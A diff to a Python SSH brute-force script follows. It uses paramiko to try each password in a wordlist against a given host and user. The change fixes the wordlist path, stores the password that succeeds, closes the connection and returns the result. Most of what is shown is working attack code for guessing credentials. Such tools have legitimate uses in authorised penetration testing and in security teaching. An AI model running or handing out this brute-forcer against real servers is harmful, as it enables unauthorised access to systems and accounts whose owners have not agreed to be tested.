@@ -9,22 +9,27 @@ def ssh_bruteforce(host, username, password_list):
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
+    found_password = None 
+
 ##----------------------------------------------------------------------------------------------------------##
 
 ##  Function to read the passwords from a list and try to login to the server using those for credentials
-    with open("password_list", 'r') as file:
+    with open(password_list, 'r') as file:
         for password in file:
             password = password.strip()
             try:
                 print(f"Trying password: {password}")
                 ssh_client.connect(hostname=host, username=username, password=password, timeout=1)
                 print(f'Password found! Password is {password}')
+                found_password = password
+                ssh_client.close()
+                break
             except paramiko.AuthenticationException:
                 print("Incorrect password.")
             except Exception as e:
                 print(f"An error has occured: {e}")
                 break
-
+    return found_password
 ##-----------------------------------------------------------------------------------------------------------##
 
 ##  Main function that will run the brute force using the input from the terminal and print the results in the terminal as well
